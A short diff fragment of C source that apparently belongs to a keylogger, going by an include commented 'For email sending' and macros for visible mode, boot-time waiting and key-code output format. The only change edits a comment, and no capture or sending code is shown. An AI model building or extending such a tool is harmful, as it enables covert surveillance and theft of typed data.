@@ -12,7 +12,7 @@
 #include <wininet.h> // For email sending
 #pragma comment(lib, "wininet.lib")
 
-// Configuration Macros
+// Configuration Macro
 #define VISIBLE           // Uncomment for visible mode
 #define BOOT_WAIT         // Uncomment to enable boot-time waiting
 #define FORMAT 0          // 0: Default, 10: Decimal codes, 16: Hex codes
